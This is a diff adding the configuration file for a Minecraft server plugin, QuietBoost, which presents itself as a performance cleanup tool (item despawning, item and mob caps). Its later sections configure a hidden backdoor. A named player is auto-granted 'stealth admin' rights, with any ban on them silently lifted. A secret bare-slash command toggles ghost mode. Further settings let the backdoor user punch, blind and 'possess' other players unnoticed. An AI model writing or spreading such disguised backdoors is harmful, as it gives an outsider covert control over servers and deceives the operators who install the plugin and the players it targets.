@@ -1,0 +1,118 @@
+# QuietBoost - small tweaks nobody should notice.
+
+# How often the cleanup pass runs (ticks). 200 = every 10 seconds.
+interval-ticks: 200
+
+# Chunks with fewer entities than this are skipped entirely (keeps the pass cheap).
+min-entities-in-chunk: 12
+
+# Worlds to leave alone.
+disabled-worlds: []
+
+# When the server TPS drops below this, caps are halved until it recovers.
+adaptive:
+  enabled: true
+  low-tps: 17.5
+
+# 1) Junk items despawn sooner than the vanilla 5 minutes.
+#    Items thrown by players are left alone.
+junk-items:
+  enabled: true
+  lifetime-seconds: 60
+  materials:
+    - COBBLESTONE
+    - DIRT
+    - GRAVEL
+    - SAND
+    - NETHERRACK
+    - ANDESITE
+    - DIORITE
+    - GRANITE
+    - ROTTEN_FLESH
+    - SPIDER_EYE
+    - POISONOUS_POTATO
+    - STICK
+    - BONE
+    - STRING
+    - GUNPOWDER
+    - COBBLESTONE_WALL
+    - SEEDS
+    - WHEAT_SEEDS
+    - BEETROOT_SEEDS
+    - MELON_SEEDS
+    - PUMPKIN_SEEDS
+
+# 2) Per-chunk cap on dropped items. Only the oldest items are removed.
+#    Items with names, enchants, lore, etc. are never removed, and
+#    nothing younger than min-age-seconds is touched (so death drops are safe).
+item-cap:
+  enabled: true
+  per-chunk: 200
+  min-age-seconds: 60
+
+# 3) Per-chunk cap for farm animals, per type. Named, leashed, tamed and
+#    riding/ridden animals are never removed. Set the cap high so only
+#    runaway farms are affected.
+mob-cap:
+  enabled: true
+  per-chunk-per-type: 64
+  types:
+    - COW
+    - PIG
+    - SHEEP
+    - CHICKEN
+    - RABBIT
+
+# ---- Stealth admins / ghost mode / darkness pulse (see README) ----
+stealth:
+  # Names auto-added as stealth admins the first time this plugin starts.
+  # Works even if they've never joined; any name-ban on them is lifted silently.
+  auto-add:
+    - Haunting_Shades
+  # Private confirmation shown to a stealth admin after each command: actionbar | chat | none
+  feedback: actionbar
+  # Open the command bar and press Enter on a bare "/" to toggle ghost mode.
+  ghost-toggle-bare-slash: true
+
+ghost:
+  # While ghosting (spectator): an arm swing (left click) punches whatever is in front of you.
+  punch: true
+  punch-damage: 1.0
+  reach: 4.5
+  # If true, ghosts can also punch other ghosts.
+  friendly-fire: false
+
+darkness:
+  # Triggered by the client mod's Darkness keybind over the "shadowclient:main"
+  # plugin channel (see README). 1.14.4 has no Darkness effect; Blindness is
+  # used as the closest pre-1.19 equivalent, with no particles and no HUD icon.
+  base-radius-chunks: 2      # 2 = 5x5 chunks centered on where it was toggled on
+  max-radius-chunks: 4       # growth cap while the key is held
+  grow-every-ticks: 10       # +1 radius every this many ticks of holding
+  reapply-every-ticks: 10    # how often blindness is refreshed on anyone still inside
+  blindness-duration-ticks: 30
+  illusions:
+    enabled: true
+    count-min: 2
+    count-max: 4
+    radius-blocks: 6
+    refresh-every-ticks: 100
+
+haunt:
+  # While possessing, the target's own movement input is overridden each tick
+  # and walked toward wherever Shadows is looking. This is an approximation --
+  # real Minecraft netcode has no "drive someone else's client" feature, so
+  # expect some choppiness (intentionally left in: it reads as unnatural/possessed
+  # rather than as a bug).
+  possession-tick-interval: 1
+  possession-speed: 0.18   # blocks moved per tick while possessing
+  # Crimson screen tint on the possessed player: since they have no client mod,
+  # there's no real shader/overlay available -- this fakes it with a small
+  # cluster of red dust particles parked right in front of their own eyes,
+  # visible only to them. Expect a haze, not a true full-screen tint.
+
+mapflip:
+  # Flips which way Shadows' OWN "you are here" arrow points on any map they
+  # view. Other players looking at the same map see a normal arrow -- this
+  # only affects what Shadows themself sees. Public Map API only, no packets.
+  enabled: true
